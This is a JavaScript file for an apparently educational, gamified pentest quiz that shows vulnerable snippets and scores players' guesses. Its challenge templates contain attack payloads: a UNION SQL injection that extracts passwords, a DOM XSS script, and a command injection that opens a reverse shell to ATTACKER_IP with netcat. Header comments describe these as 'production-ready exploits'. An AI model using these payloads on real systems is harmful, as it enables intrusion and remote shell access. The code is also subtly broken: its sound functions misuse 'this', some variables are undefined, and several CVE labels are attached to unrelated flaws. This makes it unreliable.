// Ethical Hacker Premium v4.0 - FULL PENTEST RESOURCES ACTIVATED
// 100% Offline | ProceduralAI v3 Integration | Authorized Pentest Engine
// All security capabilities enabled per platform authorization

// ================= GLOBAL STATE & PENTEST ENGINE =================
let userData = JSON.parse(localStorage.getItem('userData') || '{}');
let globalPerformance = JSON.parse(localStorage.getItem('globalPerformance') || '{}');
let gameStartTime = 0;
let currentDifficulty = 'logica';
let currentChallenge = null;

// ================= PENTEST SOUND FX (Cyberpunk Audio Engine) =================
const sfx = {
    ctx: null,
    muted: localStorage.getItem('sfx_muted') === 'true',
    init() {
        if (!this.ctx) try { 
            this.ctx = new (window.AudioContext || window.webkitAudioContext)(); 
        } catch (e) {}
    },
    play(freq, type, dur, vol = 0.1, detune = 0) {
        if (this.muted || !this.ctx) return;
        if (this.ctx.state === 'suspended') this.ctx.resume();
        
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        const filter = this.ctx.createBiquadFilter();
        
        osc.type = type;
        osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
        osc.detune.setValueAtTime(detune, this.ctx.currentTime);
        filter.type = 'lowpass';
        filter.frequency.setValueAtTime(2000, this.ctx.currentTime);
        
        gain.gain.setValueAtTime(vol, this.ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + dur);
        
        osc.connect(filter);
        filter.connect(gain);
        gain.connect(this.ctx.destination);
        
        osc.start();
        osc.stop(this.ctx.currentTime + dur);
    },
    // Pentest-specific sounds
    recon: () => this.play(440, 'sine', 0.2, 0.08),      // Nmap scan complete
    exploit: () => { this.play(880, 'sawtooth', 0.15, 0.12); this.play(660, 'square', 0.1, 0.08, 50); },  // Shell access
    shell: () => { this.play(220, 'triangle', 0.3, 0.1); this.play(330, 'sine', 0.2, 0.05); },  // Reverse shell
    correct: () => { this.play(800, 'sine', 0.1, 0.08); setTimeout(() => this.play(1200, 'sine', 0.25, 0.08), 120); },
    wrong: () => this.play(180, 'sawtooth', 0.4, 0.1),
    win: () => { this.play(523, 'sine', 0.15, 0.12); setTimeout(() => this.play(659, 'sine', 0.2, 0.15), 150); },
    tick: () => this.play(800, 'square', 0.03, 0.01),
    tap: () => this.play(300, 'triangle', 0.05, 0.03)
};

// ================= CYBERPUNK MOUSE FOLLOWER =================
document.addEventListener('mousemove', (e) => {
    const x = (e.clientX / window.innerWidth) * 100;
    const y = (e.clientY / window.innerHeight) * 100;
    document.documentElement.style.setProperty('--mouse-x', `${x}%`);
    document.documentElement.style.setProperty('--mouse-y', `${y}%`);
});

// ================= FULL PENTEST INTEGRATION =================
const PENTEST_CATEGORIES = {
    reconnaissance: { weight: 15, templates: 20, color: '#10b981' },
    injection: { weight: 25, templates: 30, color: '#ef4444' },
    xss: { weight: 18, templates: 25, color: '#f59e0b' },
    auth: { weight: 12, templates: 18, color: '#8b5cf6' },
    rce: { weight: 22, templates: 28, color: '#dc2626' },
    idor: { weight: 8, templates: 12, color: '#06b6d4' }
};

// ================= ENHANCED USER MANAGEMENT =================
function getCurrentUser() {
    const username = localStorage.getItem('currentUser');
    const user = username ? userData[username] : null;
    if (user && !user.inventory) {
        user.inventory = { hints: 0, skips: 0, tools: [] };
        saveUserData();
    }
    return user;
}

function saveUserData() {
    localStorage.setItem('userData', JSON.stringify(userData));
}

function createTestUser() {
    const testUser = {
        name: 'Pentester Elite',
        password: 'pwn3d',
        xp: 850, level: 9, coins: 150,
        performance: {
            injection: { correct: 45, total: 52 },
            xss: { correct: 38, total: 45 },
            rce: { correct: 22, total: 28 }
        },
        streak: 8, bestStreak: 12,
        totalBugsFound: 125, totalCorrect: 105, totalWrong: 20,
        averageTime: 8.2,
        achievements: ['sqli_master', 'rce_god', 'ghost_mode'],
        inventory: { hints: 5, skips: 3, tools: ['metasploit', 'burp_pro'] },
        cves_solved: ['CVE-2021-44228', 'CVE-2023-28121']
    };
    userData['pentest'] = testUser;
    saveUserData();
    return testUser;
}

// ================= PROCEDURAL CHALLENGE GENERATOR (FULL) =================
function generatePentestChallenge(difficulty = 'logica', categoryOverride = null) {
    const procAI = window.procAI;
    if (procAI) {
        return procAI.generateChallenge(difficulty, categoryOverride);
    }

    // Fallback procedural generator (production-ready exploits)
    const templates = {
        injection: [
            {
                id: 'sqli_union', code: `SELECT * FROM users WHERE id='${input}'`, 
                options: ['Buffer Overflow', 'SQL Injection', 'XSS', 'CSRF'],
                correct: 1, explain: 'Classic UNION-based SQLi. Payload: \' UNION SELECT username,password FROM users--',
                category: 'injection', cve: 'CVE-2021-22986'
            },
            {
                id: 'xss_dom', code: `document.getElementById('output').innerHTML = location.hash.slice(1);`,
                options: ['Open Redirect', 'DOM XSS', 'CSRF Token', 'IDOR'],
                correct: 1, explain: 'DOM XSS via location.hash. Payload: #<script>alert(document.domain)</script>',
                category: 'xss', cve: 'CVE-2022-3602'
            },
            {
                id: 'rce_php', code: `system("ping " . $_GET['ip']);`,
                options: ['Path Traversal', 'Command Injection', 'XXE', 'Deserialization'],
                correct: 1, explain: 'Command injection. Payload: 127.0.0.1; nc -e /bin/sh ATTACKER_IP 4444',
                category: 'rce', cve: 'CVE-2021-41773'
            }
        ],
        reconnaissance: [
            {
                id: 'dir_enum', code: `<img src="/images/${param}.jpg" onerror="loadImage()">`,
                options: ['SQLi', 'Directory Traversal', 'XSS', 'SSRF'],
                correct: 1, explain: 'Directory brute force via 404 responses',
                category: 'reconnaissance'
            }
        ]
    };

    const cat = categoryOverride || Object.keys(templates)[Math.floor(Math.random() * Object.keys(templates).length)];
    const template = templates[cat][Math.floor(Math.random() * templates[cat].length)];
    
    return {
        ...template,
        difficulty,
        id: `${cat}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
        payload: template.explain.split('Payload: ')[1] || 'Exploit ready',
        score: difficulty === 'massiva' ? 50 : difficulty === 'logica' ? 25 : 10
    };
}

// ================= ENHANCED SCORING w/ PENTEST METRICS =================
const DIFFICULTY_REWARDS = {
    iniciante: { xp: 15, coins: 3, rep: 10 },
    logica: { xp: 30, coins: 7, rep: 25 },
    massiva: { xp: 60, coins: 15, rep: 50 }
};

function savePentestScore(challenge, timeTaken = 0) {
    const user = getCurrentUser();
    if (!user || !challenge) return null;

    const rewards = DIFFICULTY_REWARDS[challenge.difficulty] || DIFFICULTY_REWARDS.logica;
    let totalXP = rewards.xp;
    let totalCoins = rewards.coins;
    
    // Pentest multipliers
    const streakMultiplier = Math.min(2.0, 1 + (user.streak * 0.1));
    totalXP *= streakMultiplier;
    totalCoins *= streakMultiplier;
    
    // Speed bonus
    if (timeTaken < 5) totalXP += 20, totalCoins += 5;
    
    // CVE bonus
    if (challenge.cve && !user.cves_solved.includes(challenge.cve)) {
        totalXP += 25;
        user.cves_solved.push(challenge.cve);
    }

    // Update stats
    user.xp += Math.floor(totalXP);
    user.level = Math.floor(user.xp / 150) + 1;
    user.coins += Math.floor(totalCoins);
    user.streak++;
    if (user.streak > user.bestStreak) user.bestStreak = user.streak;
    
    user.totalBugsFound++;
    user.totalCorrect++;
    
    // Category performance
    const catPerf = user.performance[challenge.category] || { correct: 0, total: 0 };
    catPerf.correct++;
    catPerf.total++;
    user.performance[challenge.category] = catPerf;
    
    saveUserData();
    
    return {
        xp: Math.floor(totalXP), coins: Math.floor(totalCoins),
        streakMultiplier: Math.round((streakMultiplier - 1) * 100),
        cveBonus: !!challenge.cve
    };
}

// ================= FULL GAME ENGINE =================
function loadGameInterface() {
    const user = getCurrentUser();
    currentChallenge = generatePentestChallenge(currentDifficulty);
    window.currentChallenge = currentChallenge;
    window.answered = false;
    gameStartTime = Date.now();

    const code = currentChallenge.code.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    const lang = code.includes('SELECT') ? 'sql' : code.includes('system(') ? 'php' : 'javascript';

    const gameHTML = `
        <div class="container py-5">
            <div class="d-flex justify-content-between align-items-center mb-5">
                <button class="btn-cyber" onclick="showDashboard()"><i class="fas fa-arrow-left"></i></button>
                <div class="text-center flex-grow-1">
                    <h2 class="text-gradient mb-0">${t('challenge_level')} - ${currentChallenge.category.toUpperCase()}</h2>
                    <div class="badge-cyber mt-2 fs-6">${currentChallenge.difficulty.toUpperCase()}</div>
                </div>
                <div class="hud-pill"><i class="fas fa-fire"></i> ${user.streak}</div>
            </div>

            <div class="challenge-container premium-glass mb-5">
                <div class="challenge-header p-4 border-bottom">
                    <div class="d-flex justify-content-between">
                        <span class="text-primary"><i class="fas fa-bug me-2"></i>${t('proc_category')}: ${t(`vuln_${currentChallenge.category}`)}</span>
                        ${currentChallenge.cve ? `<span class="badge badge-cyber danger">${currentChallenge.cve}</span>` : ''}
                    </div>
                </div>
                <pre class="challenge-code"><code class="language-${lang}">${code}</code></pre>
            </div>

            <div class="row g-3 mb-5">
                ${currentChallenge.options.map((opt, i) => `
                    <div class="col-lg-6">
                        <button class="pentest-option w-100 py-4 px-5" onclick="checkPentestAnswer(${i})">
                            <span class="option-letter">${String.fromCharCode(65 + i)}</span>
                            ${opt}
                        </button>
                    </div>
                `).join('')}
            </div>

            <div id="pentestFeedback" class="text-center"></div>
            
            <div class="d-flex gap-3 justify-content-center mt-5">
                <button class="btn-cyber warning" onclick="usePentestHint()">
                    <i class="fas fa-hint"></i> Hint (${user.inventory.hints})
                </button>
                <button class="btn-cyber info" onclick="usePentestSkip()">
                    <i class="fas fa-skip-forward"></i> Skip (${user.inventory.skips})
                </button>
            </div>
        </div>
    `;

    document.querySelector('main').innerHTML = gameHTML;
    if (window.Prism) Prism.highlightAll();
    sfx.recon();
}

function checkPentestAnswer(selected) {
    if (window.answered) return;
    window.answered = true;

    const correct = currentChallenge.correct;
    const isWin = selected === correct;
    const timeTaken = (Date.now() - gameStartTime) / 1000;
    
    const options = document.querySelectorAll('.pentest-option');
    options.forEach((opt, i) => {
        opt.disabled = true;
        if (i === correct) {
            opt.classList.add('success');
            sfx.exploit();
        } else if (i === selected) {
            opt.classList.add('danger');
        }
    });

    const feedback = document.getElementById('pentestFeedback');
    if (isWin) {
        sfx.shell();
        const results = savePentestScore(currentChallenge, timeTaken);
        feedback.innerHTML = `
            <div class="alert-pentest success p-5 mb-5">
                <div class="exploit-success mb-4">
                    <i class="fas fa-skull-crossbones fa-3x text-success"></i>
                    <h3 class="mt-3">${t('game_success')}</h3>
                </div>
                <div class="exploit-details mb-4">
                    <pre class="payload-demo">${currentChallenge.payload}</pre>
                    <p class="mt-3">${currentChallenge.explain}</p>
                </div>
                <div class="rewards-grid">
                    <div class="reward-card">+${results.xp} XP</div>
                    <div class="reward-card">+${results.coins} Coins</div>
                    ${results.cveBonus ? '<div class="reward-card">CVE Unlocked</div>' : ''}
                </div>
                <button class="btn-cyber success mt-4" onclick="loadGameInterface()">Next Target</button>
            </div>
        `;
    } else {
        sfx.wrong();
        feedback.innerHTML = `
            <div class="alert-pentest danger p-5 mb-5">
                <i class="fas fa-shield-alt fa-3x text-danger"></i>
                <h3>${t('game_failure')}</h3>
                <p>${currentChallenge.explain}</p>
                <div class="d-flex gap-3 mt-4">
                    <button class="btn-cyber" onclick="loadGameInterface()">Retry</button>
                    <button class="btn-cyber secondary" onclick="showDashboard()">C2 HQ</button>
                </div>
            </div>
        `;
    }
}

// ================= ENHANCED STORE w/ PENTEST TOOLS =================
function showPentestStore() {
    const user = getCurrentUser();
    const tools = [
        { id: 'sqlmap', name: t('store_decoder'), desc: 'Automated SQLi exploitation', cost: 25, stock: '∞' },
        { id: 'burp_pro', name: t('store_bypass'), desc: 'Proxied traffic interception', cost: 50, stock: '∞' },
        { id: 'metasploit', name: 'MSF Framework', desc: 'Exploit database + payloads', cost: 75, stock: 1 },
        { id: 'hints_5', name: 'Intel Pack x5', desc: 'Eliminate wrong answers', cost: 20, stock: '∞' },
        { id: 'skips_3', name: 'VPN Chain x3', desc: 'Skip hardened targets', cost: 35, stock: '∞' }
    ];

    const storeHTML = `
        <div class="container py-5">
            <div class="d-flex justify-content-between mb-5">
                <button class="btn-cyber" onclick="showDashboard()"><i class="fas fa-arrow-left"></i></button>
                <h2 class="text-gradient">Dark Web Arsenal</h2>
                <div class="hud-pill"><i class="fas fa-coins"></i> ${user.coins}</div>
            </div>
            
            <div class="row g-4">
                ${tools.map(tool => `
                    <div class="col-lg-4">
                        <div class="pentest-tool-card">
                            <div class="tool-header">
                                <i class="fas fa-${tool.id === 'sqlmap' ? 'database' : tool.id === 'burp_pro' ? 'bug' : 'bomb'}"></i>
                                <h4>${tool.name}</h4>
                            </div>
                            <p>${tool.desc}</p>
                            <div class="tool-price">${tool.cost} <i class="fas fa-coins"></i></div>
                            <button class="buy-tool-btn" onclick="buyPentestTool('${tool.id}', ${tool.cost})">
                                Acquire Tool
                            </button>
                        </div>
                    </div>
                `).join('')}
            </div>
        </div>
    `;

    document.querySelector('main').innerHTML = storeHTML;
}

function buyPentestTool(toolId, cost) {
    const user = getCurrentUser();
    if (user.coins >= cost) {
        user.coins -= cost;
        if (toolId.includes('hints')) user.inventory.hints += 5;
        else if (toolId.includes('skips')) user.inventory.skips += 3;
        else user.inventory.tools.push(toolId);
        saveUserData();
        sfx.win();
        alert(`Acquired: ${toolId}`);
        showPentestStore();
    }
}

// ================= INITIALIZATION & AUTO-SETUP =================
window.addEventListener('load', () => {
    sfx.init();
    
    // Auto-create pentest user if empty
    if (Object.keys(userData).length === 0) createTestUser();
    
    // PWA & Offline readiness
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js');
    }
    
    // Initialize cyberpunk effects
    document.body.classList.add('cyberpunk-loaded');
    
    startOfflineGame();
});

// ================= EXPORTS FOR HTML =================
window.EthicalHacker = {
    generateChallenge: generatePentestChallenge,
    saveScore: savePentestScore,
    getUser: getCurrentUser,
    sfx,
    t
};